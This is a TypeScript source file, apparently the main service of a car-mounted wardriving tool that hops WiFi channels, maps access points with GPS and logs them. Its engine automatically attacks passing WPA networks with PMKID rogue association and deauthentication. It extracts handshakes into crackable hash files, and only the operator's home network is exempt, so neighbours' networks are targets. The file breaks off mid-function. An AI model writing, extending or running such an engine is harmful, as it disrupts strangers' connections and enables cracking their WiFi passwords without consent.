import { exec, execFile } from "child_process";
import { promisify } from "util";
import { EventEmitter } from "events";
import fs from "fs";
import path from "path";
import { detectMonitorAdapter, describeIfaceIfPresent, listAdaptersForUI, MAC_RE } from "../wifiradar/adapter";
import type { MonitorAdapter } from "../wifiradar/adapter";
import { enterMonitorMode, exitMonitorMode, setChannel, getAvailable24GhzChannels } from "../wifiradar/monitor-control";
import { getGpsStatus, type GpsSatellite } from "../utils/gps";
import { getWifiStatus, armHomeNetworkWatchdog, disarmHomeNetworkWatchdog, checkHomeNetwork } from "../utils/wifi";
import { registerShutdownHook } from "../device/display";
import { lookupVendorOrRandom } from "../wifiradar/oui";
import { stopWifiRadarService, restoreWifiRadarIfHeld } from "../wifiradar/service";
import { getPlatformMode } from "../utils/platform-mode";
import { DriveCapture, type DriveFrame } from "./capture";
import { extractEapolToSession, convertCaptureToHash, extractApFrames, PmkidDriveRunner, writeBpfForAp } from "./attack";
import { driveDb, DRIVE_SESSIONS_ROOT } from "./drive-db";
import type { DriveStatus, DriveApView, ApSessionState } from "./types";
import { activeRadiosOf, parseRadioMode, radioCountForMode, type RadioMode } from "./radio-plan";

const execFileAsync = promisify(execFile);

// Kill any leftover dumpcap/tshark still bound to this interface before
// asking ip/iw to switch it back to managed mode (their sudo parents die
// with the process group, but an already-dropped-privilege child can
// briefly survive; while it holds the iface the restore fails).
function killStrayCaptures(iface: string): Promise<void> {
  return new Promise((resolve) => {
    exec(`pgrep -f "dumpcap -i ${iface}" | xargs -r kill 2>/dev/null; pgrep -f "tshark -r -" | xargs -r kill 2>/dev/null`, () => resolve());
  });
}

// ─── Policy constants (docs/wardrive.md) ───────────────────────────────
const HOP_INTERVAL_MS = 400; // same cadence wifiradar proves works on this phy
const MAX_ATTEMPTS = 4; // per AP per session; then it's "exhausted"
// Cooldown between rounds on the SAME AP. At driving speed the car LEAVES
// the AP's range in <60s — a 30s cooldown used to mean the second round
// happened out of range and was pure radio waste. 12s keeps the retry
// inside the window where the AP is still audible.
const ATTACK_COOLDOWN_MS = 12_000;
const RSSI_GATE_DBM = -75; // "good enough to try" for any AP
const RSSI_GATE_KNOWN_DBM = -85; // priority SSIDs (operator's lab list) get a wider gate
// Attack windows. Driving lessons: the car passes an AP in ~15-45s, and an
// hcxdumptool rogue-association PMKID round usually lands (or fails) inside
// the first ~12s. Short windows = more APs get a shot while in range.
// (The desktop Wifi Audit keeps its longer windows — stationary there.)
const PMKID_WINDOW_MS = 15_000; // hcxdumptool window per target
const DEAUTH_WINDOW_MS = 12_000; // hcxdumptool deauth+capture window (fallback)
const DEAUTH_SPEED_MAX_KMH = 25; // deauth fallback only slow/stopped
const MIN_EAPOL_PAIRS = 1; // PMKID counts as 1 pair; a real 4-way as 2+
const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
// GPS used to only update while a drive session was running (tick()'s own
// job) — opening /wardrive without hitting "start" showed the world map
// forever even with a live fix, since getStatus() only ever reflected
// whatever tick() last wrote. This keeps position/satellites fresh whether
// or not a session is active, so the map can center on "where we are" the
// moment the page loads.
const GPS_WATCH_MS = 2_000;
const POINT_MIN_MOVE_M = 6; // GPS track resolution (driving ~8m at 30km/h)
const POINT_MAX_DT_MS = 20_000; // also drop a point when parked this long
const TARGET_SCAN_INTERVAL_MS = 1_500; // pick a new attack target this often
// SESSION CONTINUATION: a start within this window after the previous
// session ended re-opens the SAME session (no new folder/row) — covers
// INICIAR/DETENER toggle churn, the service restarting mid-trip, dongle
// replug flashes. Beyond this, the next start creates a new session.
const RESUME_WINDOW_MS = 10 * 60_000;
const ATTACK_SETTLE_MS = 2_000; // between hcxdumptool exit and discovery restart
const BURST_GAP_MS = 1_200; // between deauth bursts inside a window

function sanitizeMac(raw: string): string {
  const mac = String(raw || "").trim().toUpperCase();
  return /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(mac) ? mac : "";
}

function haversineM(lat1: number, lon1: number, lat2: number, lon2: number): number {
  const R = 6_371_000;
  const dLat = ((lat2 - lat1) * Math.PI) / 180;
  const dLon = ((lon2 - lon1) * Math.PI) / 180;
  const s =
    Math.sin(dLat / 2) ** 2 +
    Math.cos((lat1 * Math.PI) / 180) * Math.cos((lat2 * Math.PI) / 180) * Math.sin(dLon / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(s));
}

type AirAp = {
  bssid: string;
  ssid: string;
  channel: number;
  rssi: number;
  bestRssi: number;
  security: string;
  packets: number;
  firstSeen: number;
  lastSeen: number;
};

// One discovery radio: hops its own slice of the 2.4GHz channels and runs
// its own capture. The attacker is NOT here — it lives in attackIface.
type DiscoveryRadio = {
  iface: string;
  mac: string;
  channels: number[];
  hopIndex: number;
  currentChannel: number;
  capture: DriveCapture | null;
};

// Round-robin slices of the channel list: channel i goes to radio i % n, so
// every channel is heard by exactly one discovery radio and each radio
// revisits its own channels sooner.
function splitChannels(channels: number[], radios: number): number[][] {
  return Array.from({ length: radios }, (_, i) => channels.filter((_c, idx) => idx % radios === i));
}

export class DriveWardriveService extends EventEmitter {
  private running = false;
  // Discovery radios, primary first. Empty = no session radio.
  private discovery: DiscoveryRadio[] = [];
  // Dongle pinned by the operator for wardrive, by MAC (null = auto).
  // MAC and not iface name — wlan* names get reassigned by the kernel/
  // udev on any USB reconnect, including one on a completely different
  // device (see wifiradar/adapter.ts's MonitorAdapter comment). Applied
  // only at session start; changing it while running is refused (the
  // radio is busy). Default preference when unset: AR9271 (ath9k_htc) —
  // its TX feedback in monitor mode makes PMKID/EAPOL capture
  // deterministic, vs rt2800usb which loses the driver's own TX frames to
  // userland.
  private preferredMac: string | null = null;
  // SSID the Pi's wlan0 is connected to at session start — PROTECTED. The
  // engine refuses to attack it (deauth/PMKID would drop Akbal's own link
  // and the operator's access to this web UI). Checked at start; if the
  // operator later changes wifi through the settings tab, that's fine —
  // the guard only protects the SSID captured at session start.
  private homeSsid: string | null = null;
  private channels: number[] = [];
  private hopTicks = 0;
  private hopTimer: ReturnType<typeof setTimeout> | null = null;
  private tickTimer: ReturnType<typeof setInterval> | null = null;
  private scanTimer: ReturnType<typeof setInterval> | null = null;
  private gpsWatchTimer: ReturnType<typeof setInterval> | null = null;
  private error = "";

  // In-memory air picture (rebuilt every session; the DB is the archive)
  private air = new Map<string, AirAp>();
  private apState = new Map<string, ApSessionState>();
  // Radio count preference (see radio-plan.ts): "single" (one dongle does
  // discovery AND attacks, blind during attacks), "dual" (2 radios), "triple"
  // (3 radios: 1 attack + 2 discovery) or "auto" (every connected monitor
  // radio). Operator-settable from the web UI; default from WARDRIVE_RADIO_MODE.
  private radioMode: RadioMode = parseRadioMode(process.env.WARDRIVE_RADIO_MODE) ?? "auto";
  // Monitor-capable radios found at session start (may be fewer than requested).
  private radiosConnected = 0;
  // Effective mode for the RUNNING session (resolved at start).
  private dualRadio = false;
  // The dedicated ATTACK radio (dual mode): every hcxdumptool round lives
  // here and the discovery captures keep running on their own radios untouched.
  private attackIface: string | null = null;
  // The attack radio's discovery side (dual mode): it hops its own channel
  // slice and runs its own capture whenever it is not in an attack round, so
  // all three radios of a session cover the band. null in single mode.
  private attackEntry: DiscoveryRadio | null = null;
  private attackIfaceMac: string | null = null;
  // ssid -> handshake knowledge from the DB at session start
  private knownHandshakeSsids = new Set<string>();
  // SSIDs the operator has actively attacked in past sessions — targeting
  // priority + wider RSSI gate (loaded from the DB at session start).
  private prioritySsids = new Set<string>();
  // SSIDs this session already recorded as new (dedup of "new" counting)
  private sessionNewSsids = new Set<string>();
  private sessionNewHandshakeSsids = new Set<string>();

  // Session + GPS
  private sessionId: string | null = null;
  // Remembers the last ended session so a quick restart can CONTINUE it
  // (beginSession reads these; set in finalizeSession).
  private lastEndedSessionId: string | null = null;
  private lastEndedSessionAt = 0;
  private sessionDir: string | null = null;
  private ringDir: string | null = null;
  private startedAt = 0;
  private lastPointAt = 0;
  private lastPointLat: number | null = null;
  private lastPointLon: number | null = null;
  private distanceM = 0;
  private points = 0;
  private gpsHasFix = false;
  private gpsLat: number | null = null;
  private gpsLon: number | null = null;
  private gpsSpeed: number | null = null;
  private gpsHeading: number | null = null;
  private gpsHdop: number | null = null;
  private gpsSatsUsed = 0;
  private gpsSatsInView = 0;
  private gpsSatsNeeded = 4;
  private gpsSatellites: GpsSatellite[] = [];
  private gpsError = "GPS sin datos";
  private currentChannel = 0;

  // Attack engine
  private attackBssid: string | null = null;
  private attackChannel = 0;
  private attackUntil = 0;
  private attackMethod: "pmkid" | "deauth" = "pmkid";
  private attackBusy = false; // an hcxdumptool/aireplay round is on the wire
  // Wall-clock of the attack window starting — drives the per-round
  // blind_ms metric (dual mode counts ~0: discovery keeps running).
  private roundStartedAt = 0;
  private pmkidRunner: PmkidDriveRunner | null = null;
  // hcx conversions in flight (bssid -> promise) so a burst never double-
  // fires an extraction while the previous one is still reading the ring.
  private extracting = new Set<string>();

  // Demo source (platform mode): synthetic APs/GPS, no hardware touched.
  private demo = false;
  private demoT = 0;

  constructor() {
    super();
    // Only polls while a drive session isn't already doing it at a faster
    // cadence itself (tick(), below) — this exists purely to keep GPS
    // fresh while idle/browsing, not to double up on it while driving.
    this.gpsWatchTimer = setInterval(() => {
      if (!this.running) void this.readLiveGps();
    }, GPS_WATCH_MS);
  }

  // ─── Start / stop ──────────────────────────────────────────────────────

  async start(): Promise<{ ok: boolean; error?: string }> {
    if (this.running) return { ok: true };
    this.error = "";
    if (getPlatformMode() === "demo") {
      this.demo = true;
      this.discovery = [];
      this.radiosConnected = 0;
      this.running = true;
      this.beginSession(true);
      this.broadcastStatus();
      console.log("[wardrive] started (demo)");
      return { ok: true };
    }
    try {
      // HOME NETWORK GUARD (before touching any radio): remember the SSID
      // wlan0 is connected to. The wardrive engine NEVER attacks it — a
      // deauth/PMKID round against the home AP would drop Akbal's own
      // connection (and the operator's access to this web UI while driving).
      const wifi = await getWifiStatus().catch(() => ({ connected: false, ssid: null }));
      this.homeSsid = wifi.connected ? wifi.ssid : null;
      // Watchdog: if the home connection drops mid-drive (stray deauth),
      // bring the SAME network back up — not another saved one.
      armHomeNetworkWatchdog();
      if (this.homeSsid) {
        console.log(`[wardrive] red de casa protegida: ${this.homeSsid} — nunca se atacará`);
      }
      const info = await detectMonitorAdapter(this.preferredMac);
      if (!info.present) {
        this.error = "No hay adaptador WiFi USB conectado — enchufá el dongle para wardrive";
        return { ok: false, error: this.error };
      }
      if (!info.monitorSupported || !info.iface) {
        this.error = `El adaptador ${info.description || "USB"} no soporta modo monitor`;
        return { ok: false, error: this.error };
      }
      await stopWifiRadarService().catch(() => {});
      // Single: only the primary. Otherwise every connected monitor radio is
      // a candidate, and the mode decides how many are used (radio-plan.ts).
      const candidates = this.radioMode === "single" ? [info] : await this.collectMonitorRadios(info);
      this.radiosConnected = candidates.length;
      const wanted = radioCountForMode(this.radioMode, candidates.length);
      // One dedicated attacker (ath9k_htc first) when 2+ radios are used;
      // the others keep discovering.
      const attackCandidate: MonitorAdapter | null = wanted >= 2 ? this.pickAttackRadio(candidates) : null;
      const discoveryPool = candidates.filter((r) => r !== attackCandidate).slice(0, wanted - (attackCandidate ? 1 : 0));
      const radios = attackCandidate ? [attackCandidate, ...discoveryPool] : discoveryPool;
      await enterMonitorMode(info.iface!);
      const base = await getAvailable24GhzChannels(info.phy!);
      this.channels = base.length === 0 ? [1, 6, 11] : base;
      // The attacker that can't enter monitor mode falls back to discovery
      // instead of taking the whole session down.
      let attackRadio: MonitorAdapter | null = attackCandidate;
      if (attackRadio) {
        try {
          await enterMonitorMode(attackRadio.iface!);
        } catch (err: any) {
          console.warn(`[wardrive] radio de ataque ${attackRadio.iface} no entró a monitor:`, err?.message || err);
          attackRadio = null;
        }
      }
      const discoveryAdapters: MonitorAdapter[] = [];
      for (const r of radios) {
        if (r === attackRadio) continue;
        if (r !== info) {
          try {
            await enterMonitorMode(r.iface!);
          } catch (err: any) {
            console.warn(`[wardrive] radio ${r.iface} no entró a monitor — la omito:`, err?.message || err);
            continue;
          }
        }
        discoveryAdapters.push(r);
      }
      // Dual mode: the attack radio takes the last slice, so every radio of
      // the session covers its own part of the band (3 radios = 3 slices).
      const slices = splitChannels(this.channels, discoveryAdapters.length + (attackRadio ? 1 : 0));
      this.discovery = discoveryAdapters.map((r, i) => ({
        iface: r.iface!,
        mac: r.mac,
        channels: slices[i],
        hopIndex: 0,
        currentChannel: 0,
        capture: null,
      }));
      this.dualRadio = attackRadio !== null;
      this.attackIface = attackRadio?.iface ?? null;
      this.attackIfaceMac = attackRadio?.mac ?? null;
      this.attackEntry = attackRadio
        ? {
            iface: attackRadio.iface!,
            mac: attackRadio.mac,
            channels: slices[discoveryAdapters.length],
            hopIndex: 0,
            currentChannel: 0,
            capture: null,
          }
        : null;
      const discoveryLabel = this.discovery.map((r) => r.iface).join(", ");
      const totalRadios = this.discovery.length + (this.dualRadio ? 1 : 0);
      console.log(
        totalRadios > 1
          ? `[wardrive] radios (${totalRadios}): discovery=${discoveryLabel}${this.dualRadio ? ` attack=${this.attackIface}` : ""}`
          : `[wardrive] radio mode: single (discovery=${discoveryLabel})`,
      );
      this.running = true;
      this.beginSession(false);
      this.startHopper();
      this.startTimers();
      this.broadcastStatus();
      const pinned = this.preferredMac && this.preferredMac === info.mac ? " (dongle fijado)" : "";
      console.log(`[wardrive] started (iface=${this.primaryIface()}, ${this.discovery.length} discovery, ${this.channels.length} channels)${pinned}`);
      return { ok: true };
    } catch (err: any) {
      this.error = err?.message || String(err);
      await this.stopInternal(false);
      return { ok: false, error: this.error };
    }
  }

  async stop(): Promise<{ ok: boolean }> {
    await this.stopInternal(true);
    return { ok: true };
  }

  private async stopInternal(restore: boolean): Promise<void> {
    const wasRunning = this.running;
    this.running = false;
    this.radiosConnected = 0;
    this.stopTimers();
    this.pmkidRunner?.stop();
    this.pmkidRunner = null;
    this.stopCaptures();
    this.attackEntry = null;
    this.finalizeSession();
    this.air.clear();
    this.apState.clear();
    this.attackBssid = null;
    // The home-network watchdog is a wardrive-scope safety net: disarmed
    // when the session ends (NetworkManager handles reconnection on its own
    // in normal operation).
    disarmHomeNetworkWatchdog();
    this.homeSsid = null;
    // Release the dedicated attack radio (dual mode) the same way the
    // discovery one is released.
    if (this.attackIface) {
      const atk = this.attackIface;
      this.attackIface = null;
      this.dualRadio = false;
      this.attackIfaceMac = null;
      await killStrayCaptures(atk);
      await exitMonitorMode(atk).catch((err) =>
        console.warn(`[wardrive] failed to restore attack radio ${atk}:`, err?.message || err),
      );
    }
    const radios = this.discovery;
    this.discovery = [];
    if (restore && radios.length > 0) {
      // Any dumpcap left holding the interface makes the managed-mode switch
      // fail (observed on the device: "failed to restore ... iw set type
      // managed" while an orphaned capture kept wlan1 busy). Group-kill
      // stragglers first; the capture's own stop() should already have
      // covered its children, this is the belt-and-suspenders pass.
      for (const { iface } of radios) {
        await killStrayCaptures(iface);
        await exitMonitorMode(iface).catch((err) =>
          console.warn(`[wardrive] failed to restore ${iface}:`, err?.message || err),
        );
      }
      restoreWifiRadarIfHeld();
    }
    this.demo = false;
    this.broadcastStatus();
    if (wasRunning) console.log("[wardrive] stopped");
  }

  setDemoMode(demo: boolean): void {
    if (this.demo === demo) return;
    if (this.running) void this.stop();
    this.demo = demo;
  }

  // ─── Radio mode (1 vs 2 adapters) ──────────────────────────────────────

  setRadioMode(mode: string): { ok: boolean; error?: string } {
    const parsed = parseRadioMode(mode);
    if (!parsed) {
      return { ok: false, error: "mode debe ser 'auto' | 'single' | 'dual' | 'triple'" };
    }
    if (this.running) {
      return { ok: false, error: "Detené la sesión activa antes de cambiar el modo de radios" };
    }
    this.radioMode = parsed;
    console.log(`[wardrive] radio mode: ${parsed}`);
    this.broadcastStatus();
    return { ok: true };
  }

  getRadioMode(): RadioMode {
    return this.radioMode;
  }

  // ─── Dongle selection ──────────────────────────────────────────────────

  // List every USB wifi adapter present, monitor-capability + "is this the
  // one the current/last session used" flags, for the dongle picker UI.
  async listAdapters(): ReturnType<typeof listAdaptersForUI> {
    return listAdaptersForUI(this.preferredMac);
  }

  // Pin (or unpin with null) the wardrive dongle, by MAC. Refused while a
  // session runs — changing the radio mid-attack would kill the capture.
  setPreferredAdapter(mac: string | null): { ok: boolean; error?: string } {
    if (this.running) {
      return { ok: false, error: "Detené la sesión activa antes de cambiar de dongle" };
    }
    const clean = mac === null || String(mac).trim() === "" ? null : String(mac).trim().toLowerCase();
    if (clean && !MAC_RE.test(clean)) {
      return { ok: false, error: "MAC inválida" };
    }
    this.preferredMac = clean;
    this.broadcastStatus();
    console.log(`[wardrive] dongle fijado: ${clean || "auto"}`);
    return { ok: true };
  }

  private beginSession(demo: boolean): void {
    this.startedAt = Date.now();
    // SESSION CONTINUATION (the fragmenting-sessions lesson): a start that
    // happens RESUME_WINDOW_MS after the previous session cleanly ended
    // (service restart, INICIAR/DETENER toggle churn, quick reconnect)
    // re-opens THE SAME session — one drive leg, one folder, one DB row.
    // Same-folder artifacts (session.json, ring, .pcapng/.hc22000) stay
    // together: one real trip = one session file. A long gap (car parked,
    // next day) or an explicit long-stop starts a genuinely new one.
    let id: string | null = null;
    let resumed = false;
    if (!demo && this.lastEndedSessionId) {
      const endedAt = this.lastEndedSessionAt;
      if (endedAt > 0 && Date.now() - endedAt <= RESUME_WINDOW_MS) {
        const rejoin = path.join(DRIVE_SESSIONS_ROOT, this.lastEndedSessionId);
        if (fs.existsSync(rejoin)) {
          id = this.lastEndedSessionId;
          resumed = true;
          // carried over: startedAt of the ORIGINAL begin, distance and
          // point counters read back from the DB row so the stats continue
          // instead of resetting.
          const prev = driveDb.getSession(this.lastEndedSessionId);
          this.startedAt = prev?.startedAt || this.startedAt;
          this.distanceM = prev?.distanceMeters || 0;
          this.points = prev?.points || 0;
          console.log(`[wardrive] RESUMING session ${id} (prev end ${Math.round((Date.now() - endedAt) / 1000)}s ago)`);
        }
      }
    }
    if (!id) {
      id = "drive-" + new Date(this.startedAt).toISOString().replace(/[-:]/g, "").replace(/\..+$/, "").replace("T", "-");
      this.distanceM = 0;
      this.points = 0;
    }
    // GPS track anchor always resets: the FIRST point after any start /
    // resume is the current fix (distance only accrues between real fixes).
    this.lastPointAt = 0;
    this.lastPointLat = null;
    this.lastPointLon = null;
    this.sessionId = id;
    this.sessionDir = path.join(DRIVE_SESSIONS_ROOT, id);
    this.ringDir = path.join(this.sessionDir, "ring");
    try {
      fs.mkdirSync(this.ringDir, { recursive: true });
      if (!demo) {
        if (!resumed) {
          fs.writeFileSync(path.join(this.sessionDir, "session.json"), JSON.stringify({ id, startedAt: this.startedAt, kind: "drive" }, null, 2));
        }
      } else {
        this.sessionDir = null;
        this.ringDir = null;
      }
    } catch (err: any) {
      console.warn("[wardrive] session dir failed:", err?.message || err);
      this.sessionDir = null;
      this.ringDir = null;
    }
    if (demo) {
      // The DB row stays the real-session identity; the demo never writes
      // artifacts (folders are skipped above).
    } else {
      driveDb.insertSession(id, this.startedAt);
    }
    if (!resumed) {
      this.sessionNewSsids.clear();
      this.sessionNewHandshakeSsids.clear();
      this.knownHandshakeSsids = driveDb.handshakeSsids();
    }
    // Priority targets: SSIDs this device has seen in PAST sessions with
    // attempts — the operator's recurring lab list. They get attack
    // priority over strangers AND a wider RSSI gate, so a weak lab AP
    // beats a strong neighbour AP in the targeting sort.
    // Self-heal first: handshake flags left behind by deleted sessions
    // (folder gone but flag set) would permanently block re-hunting those
    // SSIDs AND inflate the counters the user sees.
    const repaired = driveDb.repairOrphanHandshakes();
    if (repaired > 0) console.log(`[wardrive] repaired ${repaired} orphan handshake flags`);
    this.prioritySsids = driveDb.prioritySsids();
    if (demo) {
      this.startDemoFeed();
      return;
    }
    // Capture pipeline with ringbuffer artifacts (real sessions only).
    this.startCaptures();
  }

  // ─── Radio roles ───────────────────────────────────────────────────────

  private primaryIface(): string | null {
    return this.discovery[0]?.iface ?? null;
  }

  // Every monitor-capable USB dongle, the primary (pinned or auto-detected
  // pick) first. Onboard wifi never shows up here (adapter.ts excludes it).
  private async collectMonitorRadios(primary: MonitorAdapter): Promise<MonitorAdapter[]> {
    const out: MonitorAdapter[] = [primary];
    const listed = await listAdaptersForUI(this.preferredMac).catch(() => null);
    for (const entry of listed?.adapters ?? []) {
      if (!entry.monitorSupported || !entry.mac || entry.mac === primary.mac) continue;
      const info = await describeIfaceIfPresent(entry.iface);
      if (info?.monitorSupported && info.mac !== primary.mac) out.push(info);
    }
    return out;
  }

  // Dual/auto with 2+ radios: exactly one dedicated attacker, ath9k_htc first
  // (deterministic EAPOL/PMKID capture on the attack side). Never the primary:
  // the primary is always a discovery radio.
  private pickAttackRadio(radios: MonitorAdapter[]): MonitorAdapter | null {
    const candidates = radios
      .slice(1)
      .sort((a, b) => (b.driver === "ath9k_htc" ? 1 : 0) - (a.driver === "ath9k_htc" ? 1 : 0));
    return candidates[0] ?? null;
  }

  // Every radio that listens to the air right now: the discovery ones plus
  // the attack radio's discovery side (dual mode, while it isn't attacking).
  private captureRadios(): DiscoveryRadio[] {
    return this.attackEntry ? [...this.discovery, this.attackEntry] : this.discovery;
  }

  private startCaptures(): void {
    for (const radio of this.captureRadios()) {
      if (radio.capture?.isRunning()) continue;
      this.startCaptureFor(radio);
    }
  }

  private startCaptureFor(radio: DiscoveryRadio): void {
    const capture = new DriveCapture();
    capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
    capture.on("exit", () => this.onCaptureExit(radio, capture));
    capture.start(radio.iface, this.ringDir);
    radio.capture = capture;
  }

  private stopCaptures(): void {
    for (const radio of this.captureRadios()) {
      radio.capture?.stop();
      radio.capture = null;
    }
  }

  private onCaptureExit(radio: DiscoveryRadio, capture: DriveCapture): void {
    if (!this.running || radio.capture !== capture) return;
    radio.capture = null;
    if (radio === this.attackEntry) {
      // The attack radio's discovery side: unplugged = it leaves the rotation;
      // any other failure just stops listening on it until the next round.
      if (!fs.existsSync(`/sys/class/net/${radio.iface}`)) {
        this.attackEntry = null;
        this.error = `Radio de ataque ${radio.iface} desconectada — sigo con ${this.discovery.length} radio(s) de descubrimiento`;
      }
      this.broadcastStatus();
      return;
    }
    // Unplugged mid-drive vs. some other capture failure: only the former
    // drops that radio. The session keeps going on the rest and ends only
    // when no discovery radio is left.
    const gone = !fs.existsSync(`/sys/class/net/${radio.iface}`);
    if (!gone) {
      this.error = "Captura interrumpida — revisá el dongle";
      return;
    }
    this.discovery = this.discovery.filter((r) => r !== radio);
    if (this.discovery.length === 0) {
      this.error = `Dongle desconectado (${radio.iface}) — sesión detenida`;
      void this.stop();
      return;
    }
    this.error = `Dongle desconectado (${radio.iface}) — sigo con ${this.discovery.length} radio(s)`;
    this.broadcastStatus();
  }

  private finalizeSession(): void {
    if (!this.sessionId) return;
    const networks = this.sessionNewSsids.size;
    driveDb.updateSession(this.sessionId, {
      endedAt: Date.now(),
      distanceM: Math.round(this.distanceM),
      points: this.points,
      networks,
      handshakes: this.sessionNewHandshakeSsids.size,
    });
    // Remember it so a quick restart continues this same session instead
    // of fragmenting the trip into a new folder (see RESUME_WINDOW_MS).
    if (!this.demo) {
      this.lastEndedSessionId = this.sessionId;
      this.lastEndedSessionAt = Date.now();
    }
    this.sessionId = null;
  }

  // ─── Channel hopping ───────────────────────────────────────────────────

  // HOPPING STRATEGY (docs/wardrive.md): the radio must NOT sit on one
  // channel — the car keeps moving and networks off-channel are lost. The
  // hopper cycles channels but weights them by how many UNCOVERED APs
  // (no handshake, hunt-pending) each channel currently holds, refreshed
  // every few hops from the live air picture. Dwell time adapts to speed:
  // fast → short hops (cover more spectrum while passing), slow/parked →
  // longer dwell (give beacons from the same channel time to land).
  //
  // The discovery capture (dumpcap|tshark) keeps running on EVERY channel —
  // hopping only changes what the radio listens to; frames already seen
  // stay recorded. Channel-hopping is discovery; only ATTACKS lock the
  // channel (their own window, the hopper stands down via hopTimerPause).
  private channelScores = new Map<number, number>(); // channel -> uncovered APs
  private channelScoreAt = 0;

  private scoreChannels(): void {
    // Re-score at most every ~4s: cheap Map sweep, but avoid recomputing
    // on every 400ms tick.
    if (Date.now() - this.channelScoreAt < 4_000) return;
    this.channelScoreAt = Date.now();
    const counts = new Map<number, number>();
    for (const [, ap] of this.air) {
      if (ap.security === "OPEN" || !ap.ssid || ap.ssid === "(oculta)") continue;
      if (this.knownHandshakeSsids.has(ap.ssid)) continue;
      const st = this.apState.get(ap.bssid);
      if (st?.captured || st?.status === "exhausted" || (st?.attempts ?? 0) >= MAX_ATTEMPTS) continue;
      const ch = ap.channel || 0;
      if (ch < 1 || ch > 14) continue;
      counts.set(ch, (counts.get(ch) || 0) + 1);
    }
    this.channelScores = counts;
  }

  // Next channel: hop cadence over the weighted list. Channels with
  // uncovered APs get revisited more often (their weight = 1 + apCount,
  // so a channel with 5 targets is visited ~6x per cycle vs 1x for an
  // empty one); empty channels stay in the rotation at base weight so
  // NEW networks entering range still get discovered.
  private nextChannel(radio: DiscoveryRadio): number {
    const scored = radio.channels.map((ch) => ({
      ch,
      weight: 1 + (this.channelScores.get(ch) || 0),
    }));
    const total = scored.reduce((s, e) => s + e.weight, 0);
    let pick = (radio.hopIndex * 7919) % total; // deterministic spread, not random
    radio.hopIndex += 1;
    for (const e of scored) {
      pick -= e.weight;
      if (pick < 0) return e.ch;
    }
    return scored[scored.length - 1].ch;
  }

  private startHopper(): void {
    if (this.hopTimer) return;
    // Self-rescheduling hop: the dwell between hops adapts to speed
    // (fast → 400ms hops = spectrum coverage while passing; slow/parked →
    // 1.2s dwell so beacons from a channel actually land before moving on).
    const hop = () => {
      this.hopTimer = null;
      if (!this.running) return;
      // An attack round only freezes the hopper when it shares the discovery
      // radio (single mode). With a dedicated attack radio the discovery
      // radios keep hopping; freezing them there left 2 of 3 radios parked.
      const attackingOnSharedRadio = !this.dualRadio && this.attackBssid && Date.now() < this.attackUntil;
      if (!this.hopTimerPause && !attackingOnSharedRadio) {
        if (this.discovery.length === 0) return;
        this.hopTicks += 1;
        if (this.hopTicks % 2 === 0) this.scoreChannels();
        for (const radio of this.captureRadios()) {
          // The attack radio keeps its channel for the whole round.
          if (radio === this.attackEntry && this.attackBusy) continue;
          if (radio.channels.length === 0) continue;
          const ch = this.nextChannel(radio);
          radio.currentChannel = ch;
          if (radio === this.discovery[0]) this.currentChannel = ch;
          setChannel(radio.iface, ch).catch((err) =>
            console.warn(`[wardrive] setChannel(${ch}) failed (${radio.iface}):`, err?.message || err),
          );
        }
      }
      const speed = this.gpsSpeed ?? 0;
      const dwell = speed > DEAUTH_SPEED_MAX_KMH ? HOP_INTERVAL_MS : HOP_INTERVAL_MS * 3;
      this.hopTimer = setTimeout(hop, dwell);
    };
    hop();
  }

  // ─── Frame ingestion ───────────────────────────────────────────────────

  private onFrame(frame: DriveFrame): void {
    if (!this.running) return;
    if (frame.kind === "beacon") {
      const existing = this.air.get(frame.bssid);
      if (existing) {
        existing.lastSeen = frame.ts;
        existing.packets += 1;
        existing.rssi = frame.rssi;
        if (frame.rssi > existing.bestRssi) existing.bestRssi = frame.rssi;
        if (frame.ssid && frame.ssid !== "(oculta)" && existing.ssid === "(oculta)") existing.ssid = frame.ssid;
        if (frame.security !== "UNKNOWN" && existing.security === "UNKNOWN") existing.security = frame.security;
      } else {
        this.air.set(frame.bssid, {
          bssid: frame.bssid,
          ssid: frame.ssid,
          channel: frame.channel,
          rssi: frame.rssi,
          bestRssi: frame.rssi,
          security: frame.security,
          packets: 1,
          firstSeen: frame.ts,
          lastSeen: frame.ts,
        });
      }
      // Persist the full historial row (mac/ssid/pos/señal/cifrado) keyed
      // by BSSID. Hidden networks can't be matched by SSID — skipped.
      if (frame.ssid && frame.ssid !== "(oculta)") {
        driveDb.recordNetwork({
          bssid: frame.bssid,
          ssid: frame.ssid,
          security: frame.security,
          channel: frame.channel,
          rssi: frame.rssi,
          lat: this.gpsLat,
          lon: this.gpsLon,
        });
        this.sessionNewSsids.add(frame.ssid);
      }
      this.maybeAttack(frame.bssid);
      return;
    }
    if (frame.kind === "eapol") {
      this.onEapol(frame.bssid);
      return;
    }
    // deauth frame: just confirmation noise for now (bursts are counted by
    // the runner itself).
  }

  // EAPOL seen on air → if this SSID is still "uncovered", extract artifacts
  // from the ring pcaps and mark captured. This fires regardless of whether
  // WE sent a deauth (opportunistic in both senses).
  private async onEapol(bssid: string): Promise<void> {
    const ap = this.air.get(bssid);
    if (!ap || !ap.ssid || ap.ssid === "(oculta)") return;
    if (this.knownHandshakeSsids.has(ap.ssid)) return; // already covered
    if (this.extracting.has(bssid)) return;
    if (!this.ringDir || !this.sessionDir) return;
    this.extracting.add(bssid);
    try {
      const res = await extractEapolToSession(bssid, this.ringDir, this.sessionDir);
      if (res.ok && res.eapolPairs >= MIN_EAPOL_PAIRS) {
        const st = this.stateFor(bssid);
        st.captured = true;
        st.eapolFrames += res.eapolPairs;
        st.method = "deauth"; // provenance is fuzzy at drive speed; deauth-ish
        st.capFile = res.capFile;
        st.hashFile = res.hashFile;
        this.knownHandshakeSsids.add(ap.ssid);
        this.sessionNewHandshakeSsids.add(ap.ssid);
        driveDb.markHandshake({
          ssid: ap.ssid,
          bssid,
          security: ap.security,
          method: st.lastDeauthAt > 0 ? "deauth" : "pmkid",
          capFile: res.capFile,
          hashFile: res.hashFile,
          sessionDir: this.sessionDir,
          sessionId: this.sessionId || "",
          lat: this.gpsLat,
          lon: this.gpsLon,
        });
        console.log(`[wardrive] HANDSHAKE ${ap.ssid} (${bssid}) pairs=${res.eapolPairs}`);
        this.broadcastStatus();
      }
    } finally {
      this.extracting.delete(bssid);
    }
  }

  // ─── Opportunistic deauth scheduler ────────────────────────────────────

  private stateFor(bssid: string): ApSessionState {
    let st = this.apState.get(bssid);
    if (!st) {
      st = {
        status: "fresh",
        attempts: 0,
